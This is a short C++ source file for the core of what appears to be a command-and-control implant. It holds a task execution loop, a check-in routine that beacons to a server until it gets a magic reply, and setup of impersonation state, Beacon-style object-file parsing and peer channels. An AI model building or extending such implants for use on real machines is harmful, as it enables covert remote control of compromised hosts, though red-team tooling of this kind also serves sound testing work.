#include "Implant.h"
#include "Coff.h"
#include "Peer.h"

IMPLANT g_Implant;

/*
 * @brief Main loop for executing and sending tasks
 */
VOID ImplantLoop() {
    while (1) {
        ImplantExecute( MAX_TASK_EXECUTE_COUNT );
        ImplantSendTasks( MAX_TASK_SEND_COUNT );
        Sleep( 5000 );
    }
}

/*
 * @brief Send checkin request
 */
VOID ImplantRegister() {
    json   checkin;
    json   response;
    string magic;

    while (1) {

        if (!ImplantSendCheckin( checkin, response )) {
            Sleep( 5000 );
            continue;
        }

        magic = response["magic"].get<string>();
        if (!magic.compare( "baadf00d" ))
            return;

        Sleep( 5000 );
    }
}

/*
 * @brief Initialize implant object
 */
BOOL ImplantInitialize() {
    g_Implant.SessionID                   = RandomUint32();
    g_Implant.IsImpersonating             = FALSE;
    g_Implant.Interface.SessionID         = g_Implant.SessionID;
    g_Implant.Interface.BeaconDataInt     = BeaconDataInt;
    g_Implant.Interface.BeaconDataExtract = BeaconDataExtract;
    g_Implant.Interface.BeaconDataParse   = BeaconDataParse;
    g_Implant.Interface.BeaconDataLength  = BeaconDataLength;
    g_Implant.Interface.BeaconDataShort   = BeaconDataShort;

    InitializeListHead( &g_PeerList );
    InitializeListHead( &g_Implant.JobList );
    InitializeListHead( &g_Implant.TaskRequestList );
    InitializeListHead( &g_Implant.TaskResponseList );

    if (!ChannelInitialize()) {
        return FALSE;
    }

    return TRUE;
}
